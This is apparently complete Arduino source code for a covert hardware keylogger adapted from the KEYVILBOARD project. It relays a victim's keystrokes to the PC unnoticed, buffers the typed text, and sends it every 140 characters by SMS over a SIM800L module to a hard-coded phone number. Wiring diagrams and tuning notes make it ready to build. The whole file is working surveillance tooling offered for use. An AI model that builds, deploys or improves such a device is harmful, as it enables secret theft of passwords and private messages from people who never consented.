// Arduino Pro Micro adaptation of https://github.com/helmmen/KEYVILBOARD (originally for Teensy)
/*
    The wiring could be flexible because it relies on SoftwareSerial.
    The wiring used with the code below is:

    [ Pro Micro 5V   ->  sim800L ]
                8    ->  SIM_TXD
                9    ->  SIM_RXD
                VCC  ->  5V
                GND  ->  GND
                GND  ->  2nd GND
    
    [ Pro Micro 5V   ->   Usb Host Mini Board ]   // Vertical lines indicate that the connection is made on the same module
             GND    ->    0V (GND)
                              |
                         4.7K resistor
                              |
                             RX
                             
              15    ->    TX
              14    ->    2K resistor -> RX
             RAW    ->    5V   
             
              3     ->    SS
              |
         10K resistor
              |
             GND

    Possible design (pictures lack pin 3 -> SS pin connection): 
    https://cdn.discordapp.com/attachments/417291555146039297/417340199379533824/b.jpg
    https://cdn.discordapp.com/attachments/417291555146039297/417340239942778880/c.jpg

    Make sure to read the comments below regarding sim800L baud rate. It has essential information required to make it work.
*/

/* USER BASIC + ESSENTIAL SETTINGS */
#define PHONE_RECEIVER_NUMBER "+44000000000"
#define CHAR_LIMIT 140 // number of characters before it sends sms (shouldn't be more than 150)
/* 
    The serial connection speed below (for the SIM800L) heavily impacts how fast the sms are sent. The higher value = the faster speed.
    The default baud rate of sim800L appears to be 9600. It could be changed by sending AT+IPR=<rate> command. Possible values of the sim800L 
    baud rates compatible with Arduino Pro Micro are: 1200, 2400, 4800, 9600, 19200, 38400, 57600, 115200. If you look at the original 
    version that uses Teensy it has it set to 115200, I'm not aware of the reliability of it for Teensy because I never tested it but for 
    the Arduino Pro Micro 115200 baud rate was unreliable for me and resulted in slightly "gibberish" output. 38400 worked fine (AT+IPR=38400 command).
    57600 apeared to be the highest reliable frequency compatible between these 2 boards during my test but it's also the weirdest one...
    Twice I used AT+IPR=57600 command and twice it set it to 57700... Keep that in mind if you do the same, because if I didn't notice the response which 
    said 57700 instead of 57600 I would probably assume that I have to look for some way to revert it to orginal settings through some reset, just because it 
    set the baud rate to incorrect value. (even the datasheet says that it supports 57600 but in practice it changed it to 57700...)
    Using 57700 baud rate 140 characters long sms takes around 50ms to send (0.05 of a second).
*/
#define BAUD_RATE_SIM800L 57700 // default is 9600 so send AT+IPR=57700 to it through serial monitor
#define BAUD_RATE_USB_HOST_BOARD 9600 // it's set to default which seems to be fast enough


/* MORE SPECIFIC SETTINGS + DEBUGGING */
#define BAUD_RATE_SERIAL_DEBUGGING 9600
#define DELAY_BEFORE_RELEASING_KEYS 5 // milliseconds, time between pressing and releasing the button
#define SIM800L_RESPONSE_TIMEOUT 2000 // milliseconds 
#define SIM800L_RESPONSE_KEEP_WAITING_AFTER_LAST_CHAR_RECEIVED 10 // milliseconds
#define DIGITAL_PIN_KEYUP_KEYDOWN_STATE 3 // Arduino digital input pin connected to SS pin of USB host board
#define KEY_HOLD_REPETITION_START_TIME 600
#define KEY_HOLD_REPETITION_TIME_SEPARATION 14

//#define ctrlKey KEY_LEFT_GUI //OSX
#define ctrlKey KEY_LEFT_CTRL //Windows and Linux  (ctrlKey variation was copied from: https://www.arduino.cc/en/Reference/KeyboardPress)

//#define SERIAL_DEBUG // I'd recommend  to comment it out before deploying the device, use it for testing and observing Serial Monitor only

/*
    Arduino Pro Micro keyboard/mouse functions have a peculiar characteristic...
    If the serial monitor is not opened and nothing is reading serial then any keyboard typing
    or mouse movements are lagging hard. Therefore there's a custom Serial_print function which
    controls whether or not to send debug lines using Serial_print depending on the state
    of SERIAL_DEBUG.
*/

/* END OF SETTINGS */


#ifdef SERIAL_DEBUG // before compiling the code Arduino will check wether the "#define SERIAL_DEBUG" was present and depending on that the custom serial print function will actually print things or do nothing
  /* 
     The lines below make Serial_print() function have the same functionality as the original Serial.print()
     Someone could ask why create another function instead of using original one, it's created for the 
     comfort of the developer who can toggle all the debugging output by commenting out a single line.
     Otherwise it would be necessary to comment out all the Serial.print() calls which would take time and effort. 
     This way all that has to be done to toggle the output is to uncomment or comment out the "#define SERIAL_DEBUG" line.
  */
  #define Serial_begin(x) Serial.begin(x) // now when Serial_begin will be used it will do exactly the same as the original Serial.begin
  #define Serial_print(x) Serial.print(x)
  #define Serial_println(x) Serial.println(x)
#else // else define these functions as empty, so they will do nothing if the "#define SERIAL_DEBUG" line is not present above (e.g. if it's commented out)
  #define Serial_begin(x)  // now Serial_begin function does nothing and doesn't even have to be deleted from any other part of the code, it can just stay there because it will do nothing
  #define Serial_println(x)
  #define Serial_print(x)
#endif

#include "Keyboard.h" // library that contains all the HID functionality necessary pass-on the typed and logged keys to the PC
#include <SoftwareSerial.h> // library required for serial communication using almost(!) any Digital I/O pins of Arduino 
/*  
    "Not all pins on the Leonardo and Micro support change interrupts, so only the following can be used for RX: 8, 9, 10, 11, 14 (MISO), 15 (SCK), 16 (MOSI)." 
    (see: https://www.arduino.cc/en/Reference/SoftwareSerial)
*/ 
SoftwareSerial KeyboardSerial(15, 14); //communication with USB host board (receiving input from keyboard)
SoftwareSerial SmsSerial(8, 9); //communication with sim800L


/*
    "struct" below is a data structure that will allow to create an array that includes different datatypes.
    In the further part of this sketch the code will have to know what key to press when certain byte is received from USB host shield,
    it will also have to know what message to output to the Serial Monitor. These are 3 different values,
    someone could create a big chunk of "else if" statements or put all the information into concise 
    structure, loop through each item, do appropriate checks and trigger relevant actions. 

    Instead of 3 arrays like:
    byte bytesReceived[] = {0x49, 0x51, etc...};
    byte keysToPress[] = {KEY_PAGE_UP, KEY_PAGE_DOWN, etc...};
    char* keyNamesToPrint[] = {"[PgUp]", "[PgDn]", etc...};

    We have a single struct like:   
    EscapedKey escapedKeysData[] = {
      0x49, KEY_PAGE_UP, "[PgUp]",
      0x51, KEY_PAGE_DOWN, "[PgDn]",
      etc...
      };

    Which can later be accessed like:
    escapedKeysData[5].correspondingByte  // 6th element of that array (that is actually 0x53)
    escapedKeysData[5].pressedkey         // 6th element of that array (that is actually KEY_DELETE)
    escapedKeysData[5].loggedText         // 6th element of that array (that is actually "[Del]")
*/
struct EscapedKey {  
  byte correspondingByte;
  byte pressedKey;
  char* loggedText;
};

EscapedKey escapedKeysData[] = {
  0x49, KEY_PAGE_UP, "[PgUp]",
  0x51, KEY_PAGE_DOWN, "[PgDn]",
  0x47, KEY_HOME, "[Home]",
  0x4F, KEY_END, "[End]",
  0x52, KEY_INSERT, "[Ins]",
  0x53, KEY_DELETE, "[Del]",
  0x3B, KEY_F1, "[F1]",
  0x3C, KEY_F2, "[F2]",
  0x3D, KEY_F3, "[F3]",
  0x3E, KEY_F4, "[F4]",
  0x3F, KEY_F5, "[F5]",
  0x40, KEY_F6, "[F6]",
  0x41, KEY_F7, "[F7]",
  0x42, KEY_F8, "[F8]",
  0x43, KEY_F9, "[F9]",
  0x44, KEY_F10, "[F10]",
  0x57, KEY_F11, "[F11]",
  0x58, KEY_F12, "[F12]",
  0x48, KEY_UP_ARROW, "[Up]",
  0x50, KEY_DOWN_ARROW, "[Down]",
  0x4B, KEY_LEFT_ARROW, "[Left]",
  0x4D, KEY_RIGHT_ARROW, "[Right]",
  0x54, KEY_RIGHT_GUI, "[Print]",
  0x5B, KEY_LEFT_GUI, "[Windows]",
};

byte altCombined_CharSymbols[] = {0x1e, 0x30, 0x2e, 0x20, 0x12, 0x21, 0x22, 0x23, 0x17, 0x24, 0x25, 0x26, 0x32, 0x31, 0x18, 0x19, 0x10, 0x13, 0x1a, 0x14, 0x16, 0x2f, 0x11, 0x2d, 0x15, 0x2c}; 

EscapedKey altCombined_F_Keys[] = {
  0x68, KEY_F1, "[ALT+F1]",   
  0x69, KEY_F2, "[ALT+F2]",
  0x6a, KEY_F3, "[ALT+F3]",     
  0x6b, KEY_F4, "[ALT+F4]",
  0x6c, KEY_F5, "[ALT+F5]",    
  0x6d, KEY_F6, "[ALT+F6]",
  0x6e, KEY_F7, "[ALT+F7]",    
  0x6f, KEY_F8, "[ALT+F8]",
  0x70, KEY_F9, "[ALT+F9]",    
  0x71, KEY_F10, "[ALT+F10]",
  0x8b, KEY_F11, "[ALT+F11]",    
  0x8c, KEY_F12, "[ALT+F12]",
  0x9, KEY_TAB, "[ALT+TAB]",
};

char flag_esc = 0; // variable changed depending on the value received from USB host board that indicates the use of "escaped character" (like Page-up, Page-down, Up-arrow, etc.) 
char TextSms[CHAR_LIMIT+2]; // + 2 for the last confirming byte sim800L requires
int char_count; // how many characters were "collected" since turning device on (or since last sms was sent)
char sms_cmd[40]; // it will contain the command that will be sent to the USB host board, phone input is located at the top of the code so it's easily changable but requires an array of chars to be declared before merging the phone number with remaining part of the command
#define SIM800L_RESPONSE_MAX_LENGTH 70
char sim800L_response[SIM800L_RESPONSE_MAX_LENGTH];

byte lastKeyPressed;
unsigned long lastKeyPressedTime;
unsigned short keysCountAfterEscapedKey = 1;
bool wasLastKeyDebounced = true;
unsigned short keyRepetitionCount;


void setup() {
  Serial_begin(BAUD_RATE_SERIAL_DEBUGGING); // begin serial communication with PC (so Serial Monitor could be opened and the developer could see what is actually going on in the code) 
  KeyboardSerial.begin(BAUD_RATE_USB_HOST_BOARD); // begin serial communication with USB host board in order to receive key bytes from the keyboard connected to it
  SmsSerial.begin(BAUD_RATE_SIM800L); // begin serial communication with the sim800L module to let it know (later) to send an sms 
  SmsSerial.println("AT+CMGF=1"); // AT+CMGF command sets the sms mode to "text" (see 113th page of https://www.elecrow.com/download/SIM800%20Series_AT%20Command%20Manual_V1.09.pdf)
  Keyboard.begin(); // start HID functionality, it will allow to type keys to the PC just as if there was no keylogger at all
  Serial_print("ready");
  KeyboardSerial.listen(); // only 1 software serial can be listening at the time, by default the last initialized serial is listening (by using softserial.begin())
  pinMode(DIGITAL_PIN_KEYUP_KEYDOWN_STATE, INPUT);
}

void loop() {
  HandlingSim800L(); // function responsible for sending sms
  HandlingUSBhostBoard(); // function responsible for collecting, storing keystrokes from USB host board, it also is typing keystrokes to PC 
}




/* ------------------------------------------------------------------------------------------------------------

    USB host board stuff
  
 */

void HandlingUSBhostBoard() { // function responsible for collecting, storing keystrokes from USB host board, it also is "passing" keystrokes to PC 
  if (KeyboardSerial.available() > 0) { // check if any key was pressed     
    lastKeyPressedTime = millis();
    wasLastKeyDebounced = false;
    byte inByte = KeyboardSerial.read(); // read the byte representing that key
    //Serial_print(inByte); Serial_print(" - "); Serial_println((char)inByte);
    if (inByte == 27){flag_esc = 1; keysCountAfterEscapedKey = 0;} // if 27 key was pressed then do nothing
    else {
      ApplyActionForKeyByte(inByte, flag_esc);
      lastKeyPressed = inByte;
      keysCountAfterEscapedKey++;
    }
    keyRepetitionCount = 0;
  }
  
  // Line responsible for checking whether button was debounced
  if(digitalRead(DIGITAL_PIN_KEYUP_KEYDOWN_STATE) < 1){wasLastKeyDebounced = true; keyRepetitionCount=0;}

  // Lines below define what happens when button is being hold down over certain amount of time 
  if(wasLastKeyDebounced == false) {
    unsigned long timePassed = millis() - lastKeyPressedTime;
    if(timePassed > KEY_HOLD_REPETITION_START_TIME && ((timePassed - KEY_HOLD_REPETITION_START_TIME) / KEY_HOLD_REPETITION_TIME_SEPARATION) > keyRepetitionCount){
      byte last_flag_esc = 1 ? (keysCountAfterEscapedKey < 2) : 0;
      ApplyActionForKeyByte(lastKeyPressed, last_flag_esc);
      keyRepetitionCount++;
    }
  }

  //If byte 27 was received alone (without any immediate following byte) then the function below will type the Esc key and print it 
  ActualEscKeyFix(lastKeyPressedTime);
}

void ActualEscKeyFix(unsigned long lastKeyPressedTime){
  if(flag_esc == 1){
    if(millis() - lastKeyPressedTime > 50){
      flag_esc = 0;
      Serial_println("[Esc]");
      Keyboard.press(KEY_ESC);
      delay(DELAY_BEFORE_RELEASING_KEYS);
      Keyboard.releaseAll();    
      keysCountAfterEscapedKey = 1;
    }
  }
}

void ApplyActionForKeyByte(byte inByte, byte flag_state){
  if (flag_state == 1) {
    // Previous char was ESC - Decode all the escaped keys
    PrintOrPressEscapedKey(inByte); // prints but doesn't type
    flag_esc = 0;
  }
  else {
    Serial_print(inByte); Serial_print(" - "); Serial_println((char)inByte); // debug line
    
    if ((inByte >= 1 && inByte <= 26) && (inByte < 8 || inByte > 10) && inByte != 13) { // for all of the Control+someChar
      // >= stands for "higher or equal"
      // && stands for "and"
      // || stands for "or"
      Serial_print(F("Control+"));
      Serial_println((char)(inByte + 96)); // 1 for a + 96 gives 97 which is ascii value for it, the same happens for all the other characters from a to z
      Keyboard.press(ctrlKey);
      Keyboard.press((char)(inByte + 96));
      delay(DELAY_BEFORE_RELEASING_KEYS);
      Keyboard.releaseAll();
    }
    else if (inByte == 8) {
      Serial_println(F("Backspace"));
      char_count--; //This is for that backspaced stuff is non important in the array
      if(char_count < 0){char_count = 0;} // otherwise index could be negative if backspace was repeatedly pressed
      Keyboard.press(KEY_BACKSPACE);
      delay(DELAY_BEFORE_RELEASING_KEYS);
      Keyboard.releaseAll();
    }
    else if (inByte == 9) {
      Serial_println(F("^T"));
      TextSms[char_count] = '^';
      char_count++;
      if(char_count > CHAR_LIMIT - 3){Serial_println("Warning: TAB (2 bytes) could overwrite 1 of the last characters...");}
      TextSms[char_count] = 'T';
      Keyboard.press(KEY_TAB);
      delay(DELAY_BEFORE_RELEASING_KEYS);
      Keyboard.releaseAll();
    }
    //10 is just left
    else if (inByte == 13) {
      Serial_println(F("Enter"));
      Keyboard.press((char)inByte);
      delay(DELAY_BEFORE_RELEASING_KEYS);
      Keyboard.releaseAll();
    }
    else {
      TextSms[char_count] = (char)inByte;
      char_count++;
      Keyboard.press((char)inByte);
      delay(DELAY_BEFORE_RELEASING_KEYS);
      Keyboard.releaseAll();
    }
  }
}

void PrintOrPressEscapedKey(byte inByte){
  // print only
  for (byte i = 0; i < sizeof(escapedKeysData) / sizeof(EscapedKey); i++) {
    if (inByte == escapedKeysData[i].correspondingByte) {
      Serial_println(escapedKeysData[i].loggedText);
      Keyboard.press(escapedKeysData[i].pressedKey);
      delay(DELAY_BEFORE_RELEASING_KEYS);
      Keyboard.releaseAll();
      return;
    }
  }

  // alt based (type to PC)
  for (byte i = 0; i < sizeof(altCombined_CharSymbols); i++) {
    if (inByte == altCombined_CharSymbols[i]){
      Serial_print(F("Alt+"));
      Serial_println((char)(i + 97)); // 0+97 for a gives 97 which is ascii value for it, the same happens for all the other characters from a to z
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press((char)(i + 97));
      delay(DELAY_BEFORE_RELEASING_KEYS);
      Keyboard.releaseAll();
      return;
    }
  }

  for (byte i = 0; i < sizeof(altCombined_F_Keys) / sizeof(EscapedKey); i++) {
    if (inByte == altCombined_F_Keys[i].correspondingByte) {
      Serial_println(altCombined_F_Keys[i].loggedText);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press(altCombined_F_Keys[i].pressedKey);
      delay(DELAY_BEFORE_RELEASING_KEYS);
      Keyboard.releaseAll();
      return;
    }
  }

  Serial_print(F("[?]"));
}




/* ------------------------------------------------------------------------------------------------------------

    sim800L stuff
  
 */

void HandlingSim800L() { 
  if (char_count == CHAR_LIMIT - 1) { // -1 is there because KEY_TAB takes 2 characters to write and if it would be the last pressed key it would write over the range of the array
    unsigned long functionEntryTime = millis();
    
    SmsSerial.listen();
    Serial_println("\nSMS with the following content is about to be sent to sim800L: "); Serial_println(TextSms);
    sprintf(sms_cmd, "AT+CMGS=\"%s\"\r\n", PHONE_RECEIVER_NUMBER); // format the sms command (so the number can be easily changed at the top of the code) 
    Send_Sim800L_Cmd(sms_cmd, ">");
    TextSms[char_count] = 26; TextSms[char_count+1] = 0;
    SmsSerial.print(TextSms); // send additional part which includes the actual text
    //Send_Sim800L_Cmd(TextSms, "OK");
    Serial_println("SMS should be sent now, however the code doesn't wait for confirmation because it arrives after too long.");
    char_count = 0; // reset the index of TextSMS[char_count] and start writing to it again with new key-bytes
    KeyboardSerial.listen();

    Serial_print("Sending SMS took: "); Serial_print(millis() - functionEntryTime); Serial_println("ms.");
  } 
}

void Send_Sim800L_Cmd(char* cmd, char* desiredResponsePart){
  SmsSerial.write(cmd);
  Serial_println(F("\nThe following command has been sent to sim800L: ")); Serial_println(cmd);
  Serial_println(F("Waiting for response..."));
  
  if(!Get_Sim800L_Response(sim800L_response, cmd, SIM800L_RESPONSE_TIMEOUT, SIM800L_RESPONSE_KEEP_WAITING_AFTER_LAST_CHAR_RECEIVED)){
    Serial_print(F("WARNING: No response received within ")); Serial_print(SIM800L_RESPONSE_TIMEOUT); Serial_println("ms.)");
  }
  else{
    if(strstr(sim800L_response, desiredResponsePart)){  
      Serial_println("Response: "); Serial_println(sim800L_response);
    }
    else{
      Serial_println(F("WARNING: Response did not include desired characters."));
      Serial_println("Response: "); Serial_println(sim800L_response);
    }
  }
}

// eg. if(Get_Sim800L_Response(sim800L_response, 1000, 10);){}
bool Get_Sim800L_Response(char* response, char* lastCmd,  unsigned short timeout, unsigned short keepCheckingFor) { // timeout = waitForTheFirstByteForThatLongUntilReturningFalse, keepCheckingFor = checkingTimeLimitAfterLastCharWasReceived
  for(byte i=0; i<SIM800L_RESPONSE_MAX_LENGTH; i++){response[i]=0;}  //clear buffer
  
  unsigned long functionEntryTime = millis(); unsigned long currentTime = millis();
  while(SmsSerial.available() <= 0){
    delay(1);
    currentTime = millis();
    if(currentTime - functionEntryTime > timeout){
      return false;
    }
  }

  byte i=0;
  byte ignorePreviouslyTypedCommand = 0; // used to ignore the command that was sent in case if it's returned back (which is done by the sim800L...)
  unsigned long lastByteRec = millis(); currentTime = millis(); // timing functions (needed for reliable reading of the BTserial)
  while (keepCheckingFor > currentTime - lastByteRec) // if no further character was received during 10ms then proceed with the amount of chars that were already received (notice that "previousByteRec" gets updated only if a new char is received)
  {      
    currentTime = millis();   
    while (SmsSerial.available() > 0 && i < SIM800L_RESPONSE_MAX_LENGTH-1) {
      if(i == strlen(lastCmd)){
        if(!strncmp(response, lastCmd, strlen(response)-1)){
          ignorePreviouslyTypedCommand = i+1;
          //Serial_println("IGNORING_PREVIOUSLY_TYPED_CMD_THAT_IS_RETURNED_FROM_SIM_800L");
          for(byte j=0; j<i; j++){response[j]=0;} // clear that command from response
        }
      }
      byte ind = i - ignorePreviouslyTypedCommand;
      if(ind < 0){ind=0;} 
      response[ind] = SmsSerial.read(); 
      i++;
      lastByteRec = currentTime;
    }    
    if(i >= SIM800L_RESPONSE_MAX_LENGTH-1){return true;}
  }
  return true;
}

